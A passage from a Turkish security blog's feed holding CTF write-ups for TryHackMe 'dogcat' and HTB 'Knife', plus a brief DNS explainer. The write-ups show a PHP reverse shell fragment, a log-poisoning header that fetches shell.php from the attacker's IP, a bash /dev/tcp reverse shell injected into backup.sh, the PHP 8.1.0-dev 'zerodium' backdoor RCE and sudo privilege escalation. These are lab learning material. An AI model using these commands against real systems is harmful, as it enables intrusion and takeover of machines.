$input);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="line">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">function printit ($string) &#123;</span><br><span class="line">if (!$daemon) &#123;</span><br><span class="line">print &quot;$string\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>IP ve PORT parametrelerini kendinize göre düzenlemeniz gerekiyor. Ben PORT için 1234 seçtim.<br>sunucudan reverse shell bağlantısı geldiğinde yakalayabilmek için:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p>ardından kodun bulunduğu dizinde basit bir sunucu servis etmeye başladım.</p><pre><code>python3 -m http.server    </code></pre><p>Bir curl isteği ile <code>shell.php</code> dosyamı sunucuya çekmem gerekiyor.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;10.10.30.6&quot; -H &quot;User-Agent: &lt;?php file_put_contents(&#x27;shell.php&#x27;,file_get_contents(&#x27;http://10.8.216.50:8000/shell.php&#x27;))?&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>isteği gönderdikten sonra web tarayıcısında sayfayı yeniledim ve artık <code>shell.php</code> dosyası sunucuda. Web tarayıcısında <code>10.10.30.6/shell.php</code> sayfasına gittiğimde netcat’e reverse shell gelmiş oldu.</p><h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr><p>İlk yapacağım şey <code>sudo -l</code> ile root yetkisi ile çalıştırabileceğim komutları listelemek.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on e6ba91bdb0c7:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on e6ba91bdb0c7:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure><p><a href= "https://gtfobins.github.io/gtfobins/env/">GTFObins</a>‘de env için yetki yükseltme teknikleri buldum. <code>sudo env /bin/sh</code> uyguladığımda artık sistemde yetkili kullanıcıyım.</p><p>flag3’de makinanın farklı bir ortamda çalıştığı ipucunu aldım ve kontrol etmek için kök dizinde <code>ls -la</code> çalılştırdığımda bir docker içinde olduğumu anladım. Docker’dan çıkmak için sisteme sonradan kurulan paketlerin bulunduğu <code>/opt</code> klasörüne gidiyorum. <code>/backups</code> klasöründe <code>backup.sh</code> ‘ın içine reverse shell için bir bash komutu yazmam yeterli olacak.</p><p>İlk önce kendi makinemda netcat ile dinlemeye aldım.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>ardından dogcat makinesında:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/10.8.216.50/6666 0&gt;&amp;1&quot; &gt;&gt; backup.sh</span><br></pre></td></tr></table></figure><p>Mutlu son. Root yetkisi ile shell aldık. Son flag de burada.</p>]]></content>
      
      
      <categories>
          
          <category> CTF Çözüm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> LFI </tag>
            
            <tag> Log Poisoning </tag>
            
            <tag> Php filters </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS Nedir, Nasıl Çalışır?</title>
      <link href="/2022/02/01/DNS-Nedir-Nasil-Calisir/"/>
      <url>/2022/02/01/DNS-Nedir-Nasil-Calisir/</url>
      
        <content type="html"><![CDATA[<p>DNS(Domain Name System), yani alan adı sistemi. Basitçe alan adlarını IP adreslerine çeviren, uygulama katmanında çalışan bir protokoldür.</p><p>Eğer <a href="http://www.sub.example.com/">www.sub.example.com</a> alan adını parçalara ayırmak istersek bunlar şu şekilde sıralanabilir.</p><pre><code>www = Hostsub = Sub Domainexample = Domaincom = Top Level Domain(TLD)    </code></pre></br><h1 id="DNS-Mimarisi"><a href="#DNS-Mimarisi" class="headerlink" title="DNS Mimarisi"></a>DNS Mimarisi</h1><p>Bilgisayarın DNS adresini IP adresine çevirebilmesi ilk iletişim kurması gereken sunucu <a href="https://www.computerhope.com/jargon/d/dns-resolver.htm">Resolver Server</a>‘dır. Bu sunucular çoğu zaman ISP(Internet Service Provider) yani internet servis sağlayıcınız tarafından sağlanır.</p></br><p>Resolver Server alan adını parçalara ayırır. İlk önce <a href="https://www.iana.org/domains/root/servers">Root Name Server</a> ile iletişime geçerek <code>.com</code> için TLD bilgisini alır (Root name server’ların IP adresleri resolver’ların içine doğrudan kodlanmıştır. Resolver sunucusunun admini root server listelerini güncel tutarak sistemin eksiksiz çalışmasını sağlar.). Bu bilgiye göre <a href="https://dnsmap.io/articles/what-are-top-level-domain-(tld)-name-servers">TLD Server</a> ile iletişime geçerek alan adını hangi <a href="https://www.dnsknowledge.com/whatis/authoritative-name-server/">Authorative Name Server</a>‘dan alması gerektiği bilgisini alır. Eğer alt alan adları(Sub domain) varsa bir önceki cümledeki adımları tekrarlar.<br></br><br>Son adımda resolver,  Authoritative Name Server’dan gerekli bilgileri aldıktan sonra IP adresini istemciye yani bizim bilgisayarımıza gönderir. Biz de bağlantı sağlarız.</p></br>]]></content>
      
      
      <categories>
          
          <category> Network(Ağ) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Knife Çözüm</title>
      <link href="/2022/01/20/HTB-Knife-Cozum/"/>
      <url>/2022/01/20/HTB-Knife-Cozum/</url>
      
        <content type="html"><![CDATA[<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><hr></br><p>Nmap taramasıyla açık portları ve çalışan uygulamaların versiyon bilgilerini alalım.<br>-sC ekleyerek öntanımlı scriptlerle ekstra bilgi toplayabilirim.</p><pre><code> $ nmap -sC -sV 10.10.10.242 </code></pre></br><h1 id="Nmap-Ciktisi"><a href="#Nmap-Ciktisi" class="headerlink" title="Nmap Çıktısı"></a>Nmap Çıktısı</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 13:16 +03</span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">9000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.5)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/3.8.5</span><br><span class="line">|_http-title: Directory listing for /</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds</span><br></pre></td></tr></table></figure><p>9000 portunda makinanın kök dizininden itibaren dosyalar listelenmiş. <mark>etc/passwd</mark> dosyasında james kullanıcısı dikkatimi çekti fakat daha fazla ilerletemedim. Siz belki buradan da bir şeyler yakalayabilirsiniz.</p><p>Sitenin hangi dilde yazıldığını ve dilin hangi versiyonunu kullandığını tespit etmek için <mark>curl -I 10.10.10.242</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 09 Aug 2021 09:20:55 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>PHP/8.1.0-dev ile yazıldığını öğrendim. Versiyon 8.1.0-dev için muhtemel exploitleri araştırmaya başladım ve <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">RCE hakkında bir yazı</a> buldum.</p><span id="more"></span></br><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><hr><p>Yazıda kısaca, php’nin github repository’sine 28 Mart 2021’de eklenen bir backdoor sayesinde oluşabilecek RCE anlatılıyor.</p><p><img src="/img/phprce.png" alt="phprce"></p><p>Gönderilen kod,<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"> HTTP header </a>‘larından User-Agent’ı User-Agentt şeklinde yazdıktan sonra User-Agentt değerine “zerodium” kelimesiyle başlayacak şekilde php’nin komut çalıştırmaya yarayan exec(), system() veya passthru() fonksiyonlarıyla devam eden string’den oluşacak bir RCE’yi tetikliyor.</p><p><img src="/img/POC.png" alt="POC"></p><p>Çalıştığını gördükten sonra reverse shell almak için küçük bir <a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">php/bash reverse shell kodu </a> buldum ve netcat’den shell alacağım portu dinlemeye aldım.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali /$ nc -lvnp 1234                                                                                            </span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234`</span><br></pre></td></tr></table></figure><p>Ardından bulduğum kodu php fonksiyonunun içine koyarak isteği makinaya gönderdim ve james kullanıcısı olarak shell aldım. Siz tabii ki kendi tun0 inet adresinizi gireceksiniz.</p><p><img src="/img/shell.png" alt="shell"></p><p>Shell aldıktan sonra shell’in daha stabil çalışabilmesi için <mark> python3 -c ‘import pty;pty.spawn(“/bin/bash”);’</mark> ve <mark>export TERM=screen</mark>.</p></br><h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr><p>sudo -l ile root yetkisi ile çalıştırabileceğim dosya/dizinleri listedim.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure><p>dosya başka bir dosyayı işaret ediyor ve işaret ettiği dosyaya baktığımda ruby ile alakalı dosyalar var.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/$ file usr/bin/knife</span><br><span class="line">file usr/bin/knife</span><br><span class="line">usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife</span><br><span class="line">james@knife:/$ file /opt/chef-workstation/bin/knife</span><br><span class="line">file /opt/chef-workstation/bin/knife</span><br><span class="line">/opt/chef-workstation/bin/knife: a /opt/chef-workstation/embedded/bin/ruby --disable-gems script, ASCII text executable</span><br></pre></td></tr></table></figure><p>ruby’nin exec fonksyiyonu ile bash çağırabilirim </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/home$ cd james</span><br><span class="line">cd james</span><br><span class="line">james@knife:~$ echo &quot;exec(&#x27;/bin/bash&#x27;)&quot; &gt; esc.rb</span><br><span class="line">echo &quot;exec(&#x27;/bin/bash&#x27;)&quot; &gt; esc.rb</span><br><span class="line">james@knife:~$ ls</span><br><span class="line">ls</span><br><span class="line">esc.rb  linpeas-out.txt  linpeas.sh  user.txt</span><br><span class="line">james@knife:~$ chmod +x esc.rb</span><br><span class="line">chmod +x esc.rb</span><br><span class="line">james@knife:~$ sudo /opt/chef-workstation/bin/knife exec esc.rb</span><br><span class="line">sudo /opt/chef-workstation/bin/knife exec esc.rb</span><br><span class="line">root@knife:/home/james# </span><br></pre></td></tr></table></figure><p>Mutlu son.</p>]]></content>
      
      
      <categories>
          
          <category> CTF Çözüm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Ruby </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
